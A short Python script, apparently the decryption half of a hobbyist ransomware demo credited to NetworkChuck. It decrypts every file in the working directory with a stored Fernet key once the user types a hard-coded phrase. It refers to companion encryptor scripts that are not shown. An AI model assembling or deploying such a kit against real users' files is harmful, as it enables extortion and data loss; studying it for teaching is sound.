import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "SafeProgram.py" or file == "thekey.key" or file == "Decrypt.py" or file == "FastProgram.py" or file == "FastDecrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)



with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "NetworkChuck"

user_phrase = input("Enter the secret phrase to decrypt :D\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)




print("Yipee! Your files have been decrypted :D Thanks for running this script :D hope you enjoyed! btw all credit goes to NetworkChuck one of the best youtubes for hackers/programmers")